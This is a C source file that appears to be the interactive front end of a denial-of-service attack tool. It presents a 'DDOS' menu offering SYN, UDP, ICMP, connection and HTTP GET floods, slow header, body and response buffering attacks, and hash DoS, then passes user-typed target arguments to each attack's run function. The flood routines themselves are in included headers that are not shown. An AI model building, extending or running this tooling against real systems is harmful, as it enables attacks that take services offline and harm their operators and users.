#include "header.h"

#include "ddos/get_flood.h"
#include "ddos/icmp_flood.h"
#include "ddos/syn_flood.h"
#include "ddos/udp_flood.h"
#include "ddos/conn_flood.h"
#include "ddos/hash_dos.h"
#include "ddos/header_buffering.h"
#include "ddos/body_buffering.h"
#include "ddos/response_buffering.h"

#define __SIZE_OF_INPUT__ 200
#define __MAX_TOKEN_NUM__ 20

char input[__SIZE_OF_INPUT__];
char *tokens[__MAX_TOKEN_NUM__];

void get_input() {
	printf("$ ");
	fgets(input, __SIZE_OF_INPUT__, stdin);

}
void make_tokens() {
	int i = 0;
	for (i = 0; i < __MAX_TOKEN_NUM__; i++)
		tokens[i] = NULL;
	i = 0;

	tokens[i] = strtok(input, " ");
	while (tokens[i] != NULL) {
		i++;
		tokens[i] = strtok(NULL, " ");
	}

}
int choose_running_type() {
	printf("== Choose Running Type\n");
	printf("== 1. Number Based\n"
			"== 2. Over Time\n");
	printf("== ");
	get_input();
	int t = atoi(input);
	while (t <= 0 || t > 2) {
		printf("Input should be over 0 AND <=2\n");
		get_input();
		t = atoi(input);
	}

	return t;
}

int type_choose_menu() {
	printf("- = D D O S = -\n");
	printf("1. SYN flooding\n"
			"2. UDP flooding\n"
			"3. ICMP flooding\n"
			"4. Connection flooding\n"
			"5. Get flooding\n"
			"6. Header buffering\n"
			"7. Body buffering\n"
			"8. Response buffering\n"
			"9. Hash Dos\n"
			"10. RefRef\n\n");

	get_input();
	int t = atoi(input);
	while (t <= 0 || t > 10) {
		printf("Input should be over 0 AND <=10\n");
		get_input();
		t = atoi(input);
	}

	return t;

}

int main(void) {
	int mode;

	while (1) {
		int type = type_choose_menu();

		switch (type) {
		case 1:		//syn flooding
			syn_flood_print_usage(2);
			get_input();
			make_tokens();
			syn_flood_run(tokens, 2);
			break;
		case 2:		//UDP flooding
			udp_flood_print_usage();
			get_input();
			make_tokens();
			udp_flood_main(tokens);
			break;
		case 3:		//ICMP flooding
			icmp_flood_print_usage(2);
			get_input();
			make_tokens();
			icmp_flood_run(tokens, 2);
			break; 
		case 4:		//connection flooding
			conn_flood_print_usage(1);
			get_input();
			make_tokens();
			conn_flood_run(tokens,1);
			break;
		case 5:		//get flooding
			get_flood_print_usage(2);
			get_input();
			make_tokens();
			get_flood_run(tokens,2);
			break; 
		case 6: //header buffering
			header_buffering_print_usage(1);
			get_input();
			make_tokens();
			header_buffering_run(tokens,1);
			break;
		case 7:		//body buffering
			body_buffering_print_usage(1);
			get_input();
			make_tokens();
			body_buffering_run(tokens,1);
			break;
		case 8:		//response buffering
			response_buffering_print_usage(2);
			get_input();
			make_tokens();
			response_buffering_run(tokens,2);
			break; 
		case 9:		//Hash Dos
			mode = choose_running_type();
			hash_dos_print_usage(mode);
			get_input();
			make_tokens();
			hash_dos_run(tokens, mode);
			break;
		case 10:	//Ref Ref
			break;

		}

	}
}
